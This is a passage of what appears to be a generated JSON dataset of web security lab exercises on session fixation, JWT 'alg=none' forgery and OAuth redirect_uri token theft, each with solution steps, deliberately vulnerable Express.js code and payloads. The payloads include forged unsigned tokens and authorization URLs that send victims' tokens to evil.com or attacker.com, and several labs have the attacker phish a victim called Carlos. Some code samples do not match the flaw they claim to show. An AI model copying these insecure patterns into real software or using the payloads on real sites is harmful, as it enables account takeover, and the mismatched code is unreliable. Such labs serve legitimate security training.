      "srcCode": "const express = require('express'); const app = express(); app.post('/oauth/token', (req, res) => { const { code, redirect_uri } = req.body; const validCode = 'AUTHCODE123'; if (code === validCode) { return res.json({ access_token: 'access-token-for-carlos' }); } res.status(400).json({ error: 'Invalid code' }); }); app.get('/user/:id/profile', (req, res) => { if (req.headers.authorization === 'Bearer access-token-for-carlos') res.send('Carlos profile data'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
      "payloads": [
        "POST /oauth/token { code=AUTHCODE123, redirect_uri=http://attacker.com/callback }",
        "Authorization: Bearer access-token-for-carlos"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in login flow",
      "Lab Description": "This lab implements session-based authentication using a fixed session ID passed as a cookie. The application does not regenerate session IDs upon login, enabling session fixation attacks. To solve: set a session ID cookie before login, then trick Carlos into logging in with it and reuse the session.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Set a cookie manually in the browser: sessionid=abc123 before visiting the login page.",
        "Use Burp Suite to intercept the login request and observe that the session ID remains unchanged after login.",
        "Send Carlos a phishing link that sets the sessionid=abc123 and directs him to the login page.",
        "After Carlos logs in, reuse the same sessionid=abc123 cookie in your browser.",
        "Access /my-account to retrieve Carlos's account details."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; app.post('/login', (req, res) => { const sid = req.cookies.sessionid; sessions[sid] = { user: 'carlos' }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.user === 'carlos') res.send('Carlos Account Info'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "Set-Cookie: sessionid=abc123",
        "GET /login with sessionid=abc123",
        "GET /my-account with sessionid=abc123 after Carlos login"
      ]
    },
    {
      "Lab scenario": "JWT tampering using alg=none in Authorization header",
      "Lab Description": "This lab's authentication mechanism relies on JSON Web Tokens (JWTs) passed in the Authorization header. The server trusts the JWT without verifying the signature if the algorithm is set to 'none'. This allows tampering with token content. The application uses the JWT's 'role' claim to grant admin access. To solve: Modify the JWT to escalate privileges and access the admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a valid login and extract the JWT from the Authorization header.",
        "Decode the JWT using jwt.io or a local script and inspect the header and payload.",
        "Modify the JWT header: change 'alg' to 'none'. In the payload, change 'role' to 'admin'.",
        "Remove the signature portion completely and base64 encode the new header and payload.",
        "Replace the original JWT in the Authorization header with the tampered one and access the /admin page to confirm escalation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'pass123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username, role: user.role }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.role === 'admin') return res.send('Welcome Admin'); else return res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
        "{\"alg\":\"none\"}.{ \"username\": \"carlos\", \"role\": \"admin\" }"
      ]
    },
    {
      "Lab scenario": "Session fixation in login flow using predictable session ID",
      "Lab Description": "This lab suffers from a session fixation vulnerability. The session ID is set before login and remains unchanged after authentication. The attacker can pre-generate a session ID and trick the victim into using it. After the victim logs in, the attacker hijacks the session. To solve: Fixate Carlos's session and access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to GET /session before login and extract the session cookie.",
        "Send the session ID to the victim (simulated) and have them log in via that session.",
        "After the victim logs in, reuse the same session ID in your cookies to access the /my-account endpoint.",
        "Use Burp Suite Repeater to send GET /my-account with the fixed session ID.",
        "Confirm access to the victim's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user; res.redirect('/my-account'); } else res.status(401).send('Invalid'); }); app.get('/my-account', (req, res) => { if (req.session?.user) return res.send(`Welcome ${req.session.user.username}`); else res.status(403).send('Login required'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      "payloads": [
        "GET /login with fixed session cookie",
        "Cookie: connect.sid=sess123fixed",
        "Hijack connect.sid after victim login"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration via open redirect leads to token theft",
      "Lab Description": "This lab's OAuth implementation incorrectly trusts arbitrary redirect_uris during the OAuth flow. By supplying a malicious redirect URI, an attacker can intercept the authorization code and exchange it for an access token. To solve: Capture Carlos's access token and access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify the OAuth authorization endpoint and confirm that any redirect_uri is accepted.",
        "Craft a malicious URL pointing the victim to the authorization endpoint with redirect_uri set to attacker.com.",
        "Simulate user click (victim logs in and consents) and intercept the authorization code sent to attacker.com.",
        "Exchange the stolen code using Postman or curl for an access token at the token endpoint.",
        "Use the access token in the Authorization header to access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const oauthClients = [{ client_id: 'trusted-app', client_secret: 'abc123' }]; app.get('/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; res.redirect(`${redirect_uri}?code=1234`); }); app.post('/token', express.urlencoded({ extended: true }), (req, res) => { const { code, client_id, client_secret } = req.body; if (code === '1234' && client_id === 'trusted-app' && client_secret === 'abc123') return res.json({ access_token: 'valid-token-for-carlos' }); res.status(400).send('Invalid request'); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'valid-token-for-carlos') return res.send('Account details for Carlos'); else return res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
      "payloads": [
        "https://vulnerable.com/authorize?client_id=trusted-app&redirect_uri=https://attacker.com",
        "POST /token { code: 1234, client_id: trusted-app, client_secret: abc123 }",
        "Authorization: Bearer valid-token-for-carlos"
      ]
    },
    {
      "Lab scenario": "RESTful JWT tampering in login endpoint",
      "Lab Description": "The application uses a JWT for authentication and verifies it using a public key. However, the algorithm field in the token header is not validated correctly, allowing attackers to manipulate it. The application blindly trusts unsigned tokens when 'alg' is set to 'none'. To solve: log in as the admin user and access the dashboard endpoint using a tampered token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture a valid JWT token via Postman while logging in with your own user credentials.",
        "Use jwt.io or Burp Suite to decode the token and analyze the header and payload.",
        "Change the alg field from 'RS256' to 'none' and modify the payload to {\"username\": \"admin\"}.",
        "Remove the signature section entirely and send the manipulated token in the Authorization header: Bearer <tampered_token>.",
        "Access the /admin/dashboard endpoint and confirm access is granted."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const publicKey = fs.readFileSync('./public.pem'); const users = [{ username: 'admin', role: 'admin' }, { username: 'user1', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, publicKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.verify(token, publicKey); if (decoded.username === 'admin') res.send('Admin access granted'); else res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Tampering Lab running...'));",
      "payloads": [
        "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}, Payload: {\"username\":\"admin\"}, no signature",
        "Authorization: Bearer <base64(header)>.<base64(payload)>.",
        "Token manipulation via jwt.io with RS256 → none and admin payload"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
      "Lab Description": "This application integrates third-party OAuth authentication but fails to validate redirect URIs. An attacker can craft an authorization URL with an open redirect in the redirect_uri parameter to intercept the authorization code. To solve: obtain the victim's authorization code and exchange it for an access token, then retrieve their email.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite or OWASP ZAP to intercept the OAuth flow.",
        "Craft a malicious OAuth URL with redirect_uri set to https://malicious-site.com/oauth/callback.",
        "Send this URL to the victim (can simulate by pasting directly into the browser).",
        "Once the victim authenticates, capture the authorization code from the malicious site's endpoint.",
        "Exchange the stolen code for an access token using Postman and access the /userinfo endpoint to fetch victim data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const client_id = 'app123'; res.redirect(`https://oauth-provider.com/auth?client_id=${client_id}&redirect_uri=${redirect_uri}`); }); app.get('/callback', async (req, res) => { const code = req.query.code; const token = await axios.post('https://oauth-provider.com/token', { code }); const userinfo = await axios.get('https://oauth-provider.com/userinfo', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Logged in as ${userinfo.data.email}`); }); app.listen(4000, () => console.log('OAuth Lab running...'));",
      "payloads": [
        "https://target-site.com/auth?redirect_uri=https://evil.com/oauth/callback",
        "POST /token { code: <stolen_code> }",
        "GET /userinfo Authorization: Bearer <access_token>"
      ]
    },
    {
      "Lab scenario": "SOAP API session fixation via pre-set cookie",
      "Lab Description": "The SOAP-based login endpoint accepts pre-set session IDs via cookies. The application does not regenerate session IDs after login. This allows an attacker to fix the session ID before victim logs in, then reuse it to impersonate the session. To solve: Fix a session ID, trick the victim to use it, and access the /myAccount endpoint as the victim.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Postman or Burp to send a GET /init-session request with a custom session ID in Cookie: sessionId=abc123.",
        "Trick the victim to log in using the same sessionId (simulate login with cookie set).",
        "After victim logs in, reuse Cookie: sessionId=abc123 to send a GET /myAccount request.",
        "Observe that you're now authenticated as the victim.",
        "Access /myAccount to confirm session fixation worked."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const soap = require('soap'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; app.post('/soap-login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies['sessionId']; if (username === 'victim' && password === 'securepass') { sessions[sessionId] = username; res.send('Logged in successfully'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/myAccount', (req, res) => { const user = sessions[req.cookies['sessionId']]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running...'));",
      "payloads": [
        "Cookie: sessionId=abc123",
        "POST /soap-login with sessionId=abc123 in cookie",
        "GET /myAccount with sessionId=abc123"
      ]
    },
    {
      "Lab scenario": "Session fixation in login flow",
      "Lab Description": "This lab demonstrates session fixation where the session ID is accepted from the user's request instead of being regenerated after login. The application uses a session token passed as a cookie and fails to rotate it after successful authentication, allowing attackers to hijack sessions. To solve: Fixate Carlos's session, then login as him using a pre-set session ID.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a request to the login page and observe the 'sessionid' cookie being set by the client.",
        "Send a GET request to /login with a custom session ID: Cookie: sessionid=attackerSession123",
        "Log in using your own credentials and observe that the session ID is accepted and retained.",
        "Send the session fixation link with your controlled session ID to Carlos (assume simulated delivery).",
        "Once Carlos logs in via that link, reuse attackerSession123 as Cookie to access /my-account as Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'abc123' }]; const sessions = {}; app.get('/login', (req, res) => { const sessionid = req.cookies.sessionid || req.query.sessionid || Math.random().toString(36).substring(2); res.cookie('sessionid', sessionid); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sessionid = req.cookies.sessionid; sessions[sessionid] = username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionid = req.cookies.sessionid; const username = sessions[sessionid]; if (username === 'carlos') res.send('Welcome Carlos!'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
      "payloads": [
        "GET /login?sessionid=attackerSession123",
        "Cookie: sessionid=attackerSession123",
        "POST /login with username=carlos and password=abc123 using attackerSession123 cookie"
      ]
    },
    {
      "Lab scenario": "JWT signature bypass using 'none' algorithm",
      "Lab Description": "This lab uses JWT tokens for authentication but fails to properly validate the algorithm field. It accepts tokens with the 'none' algorithm, allowing attackers to craft arbitrary tokens without a valid signature. To solve: Forge a token to impersonate Carlos and access the account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Log in as your own user and capture the JWT token using Burp or Postman.",
        "Decode the token using jwt.io or jwt_tool to identify the structure.",
        "Modify the payload to change 'username' to 'carlos' and set 'alg' to 'none' in the header.",
        "Remove the signature entirely and rebase64 the header and payload manually.",
        "Send the forged token in the Authorization: Bearer header and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'admin123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'supersecretkey'); res.json({ token }); } else { res.status(401).send('Unauthorized'); } }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.username === 'carlos') res.send('Welcome Carlos!'); else res.status(403).send('Forbidden'); }); app.listen(4000);",
      "payloads": [
        "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
        "Payload: { \"username\": \"carlos\" }",
        "Forged token: base64url(header) + '.' + base64url(payload) + '.'"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in redirect_uri validation",
      "Lab Description": "This lab simulates a vulnerable OAuth login where the redirect_uri is not properly validated. By manipulating the redirect_uri parameter, an attacker can intercept tokens issued to users. To solve: Steal Carlos's token and access the protected resource as him.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP or Burp Suite to analyze the OAuth flow when logging in via a third-party provider.",
        "Observe that redirect_uri is passed from the client and not strictly validated by the authorization server.",
        "Craft a malicious URL that points redirect_uri to your own domain: https://vulnerable.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
        "Convince Carlos to visit the crafted link (social engineering assumed).",
        "Intercept the token at evil.com and reuse it in an Authorization: Bearer header to access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; if (client_id !== '123') return res.status(403).send('Invalid client'); const token = 'token-for-carlos';  res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-for-carlos') res.send('Welcome Carlos!'); else res.status(403).send('Access denied'); }); app.listen(4000);",
      "payloads": [
        "https://vulnerable.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com&response_type=token",
        "Intercepted token: token-for-carlos",
        "GET /my-account with Authorization: Bearer token-for-carlos"
      ]
    },
    {
      "Lab scenario": "Session fixation via pre-set session cookie",
      "Lab Description": "The application uses session cookies to manage user authentication, but fails to regenerate them after login. A malicious actor can fix a known session ID before login, and force the victim to authenticate using it. The application reflects session IDs without regenerating them. To solve: hijack Carlos's session by fixing the session ID before he logs in.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite Proxy to intercept GET /login and inject your custom session cookie (e.g. sessionid=abc123).",
        "Send the login page URL to Carlos (e.g. via social engineering) with the fixed sessionid embedded via Set-Cookie.",
        "Wait for Carlos to log in, using the sessionid you supplied.",
        "After he logs in, reuse the fixed sessionid to access authenticated pages.",
        "Verify access to /my-account as Carlos to confirm exploitation."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cur3' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.cookie('sessionid', req.cookies.sessionid || Math.random().toString(36), { httpOnly: true }); return res.send('Login successful'); } return res.status(401).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid) return res.send('Welcome back, session: ' + req.cookies.sessionid); res.status(401).send('Please login'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
      "payloads": [
        "sessionid=abc123",
        "Set-Cookie: sessionid=abc123",
        "GET /login HTTP/1.1 with Cookie header injection",
        "POST /login with attacker-supplied session ID"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in authentication tokens",
      "Lab Description": "The app uses JWTs to authenticate users, but allows algorithm tampering in the header. It incorrectly trusts the 'alg' claim and accepts unsigned tokens when 'none' is specified. To solve: forge a valid token for Carlos without a signature.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept a valid JWT after logging in using Burp Suite or Postman.",
        "Decode the token header and change 'alg' to 'none'.",
        "Replace the 'sub' or 'username' claim to 'carlos'.",
        "Re-encode the JWT without a signature section.",
        "Submit the forged token in Authorization: Bearer header and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.username === 'carlos') return res.send('Welcome Carlos'); } catch (e) { return res.status(401).send('Invalid token'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT Lab running...'));",
      "payloads": [
        "Header: { \"alg\": \"none\" }, Payload: { \"username\": \"carlos\" }",
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer <forged-token>"
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation",
      "Lab Description": "The application uses OAuth to log in users via a third-party provider. However, it fails to validate the redirect_uri parameter correctly, enabling attackers to steal tokens. The app reflects the redirect_uri without whitelisting. To solve: intercept the OAuth flow and capture Carlos's token.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use OWASP ZAP to proxy and analyze the OAuth flow.",
        "Start an OAuth login and note the authorize request with the redirect_uri parameter.",
        "Change the redirect_uri to your own server (e.g., http://evil.com/callback).",
        "Send Carlos the modified authorization URL.",
        "Intercept the redirected request containing Carlos’s token at your server and use it to access his account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { code, redirect_uri } = req.query;  return res.redirect(redirect_uri + '?code=' + code); }); app.listen(4000, () => console.log('OAuth Redirect Lab running...'));",
      "payloads": [
        "redirect_uri=http://evil.com/callback",
        "https://target.com/auth?client_id=abc&redirect_uri=http://evil.com/callback&response_type=token",
        "Authorization URL with malicious redirect"
      ]
    },
    {
      "Lab scenario": "Insecure JWT validation in Authorization header (None algorithm tampering)",
      "Lab Description": "The application uses JWTs for user authentication and includes the token in the Authorization header. The server does not correctly verify the algorithm used to sign the JWT. The application trusts unsigned tokens if they specify 'alg':'none'. To solve: craft a tampered token impersonating 'carlos' and access the protected profile endpoint.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept a request after logging in and capture the JWT from the Authorization header.",
        "Use jwt.io or Burp Decoder to decode the token and observe the header with algorithm 'HS256'.",
        "Change the 'alg' to 'none' and remove the signature part, replacing it with an empty string.",
        "In Burp Repeater, modify the original Authorization header to use the tampered JWT with 'carlos' in the payload.",
        "Send the request to the /profile endpoint and verify if access is granted as 'carlos'."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); const SECRET = 'supersecretkey'; app.get('/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (!token) return res.status(401).send('Unauthorized'); const decoded = jwt.verify(token, SECRET); if (decoded.username !== 'carlos') return res.status(403).send('Forbidden'); res.send('Welcome Carlos!'); }); app.listen(4000, () => console.log('JWT Lab on http://localhost:4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration leads to token hijacking via redirect_uri manipulation",
      "Lab Description": "The application uses OAuth 2.0 for third-party login integration. It implements the implicit flow and allows redirect_uri values to be manipulated without proper validation. An attacker can craft a malicious authorization URL to intercept access tokens. To solve: extract a valid access token for carlos and use it to access the user's dashboard.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp to initiate OAuth login and capture the redirect URL pattern and client_id/redirect_uri used.",
        "Construct a malicious redirect_uri under your control (e.g., attacker.com) and craft a full authorization URL.",
        "Send the authorization link to the victim (social engineering assumed or simulate as Carlos) to obtain the access token from the fragment.",
        "Use Postman to call /api/user with the stolen access token in the Authorization header.",
        "Verify successful access to the user dashboard as carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const oauthClients = [{ client_id: 'trusted-client', redirect_uri: 'https://trusted.com/callback' }]; app.get('/auth', (req, res) => { const { client_id, redirect_uri } = req.query; const client = oauthClients.find(c => c.client_id === client_id); if (!client) return res.status(400).send('Invalid client'); res.redirect(`${redirect_uri}#access_token=abc123&token_type=bearer`); }); app.get('/api/user', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123') return res.send('Welcome Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Lab on http://localhost:4000'));",
      "payloads": [
        "https://auth.site.com/auth?client_id=trusted-client&redirect_uri=https://attacker.com/callback",
        "Authorization: Bearer abc123"
      ]
    },
    {
      "Lab scenario": "Session fixation vulnerability in GraphQL login mutation",
      "Lab Description": "The application uses a GraphQL endpoint for login, but does not invalidate the session token upon authentication. This allows an attacker to set a fixed session before the victim logs in. To solve: Fixate a session, trick the victim into logging in, then reuse the session ID to access the user's data.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Use Postman to send an initial unauthenticated request to /graphql to obtain a session cookie.",
        "Send the fixed session to the victim via phishing or simulate their login with the same session ID.",
        "Once the victim logs in, their session is tied to your predefined session ID.",
        "Replay the session cookie on the /graphql endpoint to access protected data.",
        "Query for { me { email, name } } to verify access to carlos’s account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('mutation login')) { const { username, password } = req.body.variables; if (username === 'carlos' && password === 'password') req.session.user = 'carlos'; return res.json({ data: { login: true } }); } if (query.includes('me')) { if (req.session.user === 'carlos') return res.json({ data: { me: { name: 'Carlos', email: 'carlos@example.com' } } }); return res.status(403).json({ error: 'Unauthorized' }); } res.status(400).send('Bad Request'); }); app.listen(4000, () => console.log('GraphQL Session Fixation Lab on http://localhost:4000'));",
      "payloads": [
        "mutation login($username:String!, $password:String!) { login(username:$username, password:$password) }",
        "{ \"username\": \"carlos\", \"password\": \"password\" }",
        "query { me { name, email } }"
      ]
    },
    {
      "Lab scenario": "JWT signature bypass in authorization header",
      "Lab Description": "The application uses JSON Web Tokens (JWT) for user session management. It decodes the token and verifies it using the algorithm specified in the token header. The implementation trusts the 'alg' field from user-controlled input, making it vulnerable to algorithm confusion. The application treats unsigned tokens as valid. To solve: forge an unsigned JWT to impersonate the admin user and access /admin/dashboard.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Capture a valid JWT using Burp Suite or browser dev tools from the Authorization header.",
        "2. Decode the JWT using jwt.io or Postman and examine the header and payload.",
        "3. Modify the header to set 'alg' to 'none' and the payload 'user' to 'admin'. Remove the signature.",
        "4. Replace the original token in the Authorization header with the crafted token.",
        "5. Send the request to /admin/dashboard and verify access to the admin page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecret'; app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, secret); if (decoded.user === 'admin') return res.send('Welcome Admin'); res.status(403).send('Access denied'); } catch (err) { res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Signature Bypass Lab running on http://localhost:4000'));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
        "{\"alg\":\"none\"}.{ \"user\":\"admin\" }",
        "Authorization: Bearer <JWT without signature>"
      ]
    },
    {
      "Lab scenario": "Session fixation in login flow",
      "Lab Description": "The application issues a session cookie before authentication and does not regenerate the session ID after login. This allows an attacker to fix the session ID of a victim. The attacker can trick a victim into using a known session ID, and once they log in, the attacker can use the same session ID to hijack the session. To solve: gain access to Carlos's account using a fixed session ID.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to initiate a session and capture the Set-Cookie header (e.g., sessionId=abc123).",
        "2. Trick the victim into visiting a crafted link that includes the known session cookie (e.g., by using a CSRF-like redirect or injecting a malicious image).",
        "3. Wait until the victim logs in with the attacker-fixed session ID.",
        "4. Use the same session cookie to send a GET request to /my-account.",
        "5. Verify access to Carlos's account and extract personal data from the page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); let sessions = {}; let users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = user.username; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) res.send(`Account page for ${username}`); else res.status(403).send('Not authenticated'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
      "payloads": [
        "Cookie: sessionId=abc123",
        "GET /?sessionId=abc123",
        "Hijack session after login using pre-set ID"
      ]
    },
    {
      "Lab scenario": "OAuth token theft using open redirect in callback URL",
      "Lab Description": "The application uses OAuth 2.0 with an implicit flow and accepts arbitrary redirect URIs after authorization. This introduces an open redirect vulnerability. An attacker can steal the access token by injecting a malicious redirect URL in the OAuth flow. To solve: craft a malicious OAuth URL that redirects the access token to an attacker-controlled domain and extract the token.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Start Burp Suite and inspect the login with Google OAuth flow.",
        "2. Notice that the redirect_uri parameter is not validated strictly by the server.",
        "3. Construct a malicious OAuth authorization URL that includes your domain (e.g., https://attacker.com/callback#access_token=... as the redirect_uri).",
        "4. Trick the victim into clicking the crafted URL (via phishing or injected content).",
        "5. Extract the token from the redirected request captured in your server logs or Burp Collaborator and use it to access protected resources."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const token = req.query.token; res.send(`Logged in with token: ${token}`); }); app.listen(4000, () => console.log('OAuth Redirect Lab running on http://localhost:4000'));",
      "payloads": [
        "https://auth.example.com/oauth/authorize?response_type=token&client_id=123&redirect_uri=https://evil.com/#access_token=steal",
        "OAuth redirect_uri=https://attacker.com#access_token=xyz",
        "Token leak via implicit flow redirection"
      ]
    },
    {
      "Lab scenario": "JWT tampering vulnerability in session validation middleware",
      "Lab Description": "The application uses JSON Web Tokens (JWT) for session management. However, it incorrectly trusts the 'alg' field in the JWT header without enforcing strict validation. The application uses these tokens to identify authenticated users. To solve: Forge a valid JWT for the user 'carlos' and access their My account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept the JWT after logging in with your own account using Burp Suite.",
        "Decode the JWT using jwt.io or Burp Decoder and observe the use of 'alg': 'none'.",
        "Modify the JWT header to set 'alg' to 'none' and the payload to {\"username\": \"carlos\"}.",
        "Remove the JWT signature entirely and use Postman to submit an authenticated request with the modified token.",
        "Visit the /my-account endpoint while using the forged JWT to access Carlos's data."
      ],
      "Vulnerability name": "Authentication",
